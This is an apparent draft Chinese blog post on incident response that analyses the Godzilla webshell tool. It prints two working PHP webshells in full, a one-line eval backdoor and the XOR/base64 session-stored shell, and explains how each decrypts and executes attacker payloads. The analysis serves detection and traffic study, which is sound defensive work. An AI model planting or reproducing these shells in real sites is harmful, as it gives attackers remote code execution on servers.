---
title: Webshell流量分析之哥斯拉Godzilla
date: 2026-05-21T12:37:08+08:00
lastmod: 2026-05-21T12:37:08+08:00
summary:
url: /posts/Webshell流量分析之哥斯拉Godzilla/
categories:
  - 应急响应
tags:
  - 哥斯拉流量分析
draft: true
---
# 前言

项目地址：https://github.com/BeichenDream/Godzilla

哥斯拉（Godzilla）是由Java开发的一款Webshell管理工具，支持多种类型的Webshell，支持加通信流量加密。

哥斯拉需要的环境：jdk1.8

哥斯拉支持jsp、php、aspx等多种载荷，java和c#的载荷原生实现AES加密，PHP使用异或加密。

先看一下哥斯拉已有的几种载荷

# PHP Webshell

加密器有三种：

![](image/Pasted%20image%2020260525111233.png)

## PHP_EVAL_XOR_BASE64

```php
<?php
eval($_POST["pass"]);
```

这个没啥好说的，就是一个简单的一句话木马

## PHP_XOR_BASE64

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

encode函数是一个加密异或函数，而且由于异或是对称的，所以这个函数也可以用作解密

pass就是我们生成木马时设置的pass密码

接受一个pass并进行base64解码，然后使用encode进行异或解密。先是检测session中是否之前存过payload，如果有就将之前的进行异或解密成payload，如果payload中不包含getBasicsInfo字符串则再进行一次异或解密，而后调用eval执行payload

